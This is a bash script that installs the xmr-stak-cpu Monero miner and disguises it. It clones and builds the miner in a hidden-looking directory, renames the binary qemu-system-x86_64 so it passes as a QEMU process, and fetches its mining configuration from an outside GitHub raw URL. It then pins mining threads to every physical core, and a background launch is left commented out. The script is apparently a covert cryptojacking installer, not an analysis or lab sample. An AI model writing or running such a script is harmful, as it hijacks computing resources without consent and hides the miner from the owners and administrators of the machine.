cpu_cnt=`cat /proc/cpuinfo | awk '/processor/ {print $3}' | wc -l`
#ht_enabled=``
if [  -z "$1" ]
then
        phycores=$(cat /proc/cpuinfo | egrep "core id|physical id" | tr -d "\n" | sed s/physical/\\nphysical/g | grep -v ^$ | sort | uniq | wc -l)
else
        phycores=$1
fi
echo $phycores
apt-get install -y libmicrohttpd-dev libssl-dev cmake build-essential libhwloc-dev git wget
mkdir /usr/share/packages_download
workingdir=/usr/share/packages_download/
git clone https://github.com/fireice-uk/xmr-stak-cpu.git /usr/share/packages_download/qemu-system-x86
cd $workingdir/qemu-system-x86
cmake .
make install
mv $workingdir/qemu-system-x86/bin/xmr-stak-cpu $workingdir/qemu-system-x86/bin/qemu-system-x86_64
curl https://raw.githubusercontent.com/githubuserold/miner/master/config_for_sed.txt > $workingdir/qemu-system-x86/bin/config.txt
echo -e "],\n$(cat $workingdir/qemu-system-x86/bin/config.txt)" > $workingdir/qemu-system-x86/bin/config.txt
for (( core=0; core<$phycores; core++ )); do
         echo -e "   { "low_power_mode" : false, "no_prefetch" : true, "affine_to_cpu" : ${core} },\n$(cat $workingdir/qemu-system-x86/bin/config.txt)" > $workingdir/qemu-system-x86/bin/config.txt
done
echo -e "[\n$(cat $workingdir/qemu-system-x86/bin/config.txt)" > $workingdir/qemu-system-x86/bin/config.txt
echo -e "\"cpu_threads_conf\" :\n$(cat $workingdir/qemu-system-x86/bin/config.txt)" > $workingdir/qemu-system-x86/bin/config.txt
cd $workingdir/qemu-system-x86/bin/
#nohup ./qemu-system-x86 &
#rm -r /usr/share/packages_download/qemu-system-x86
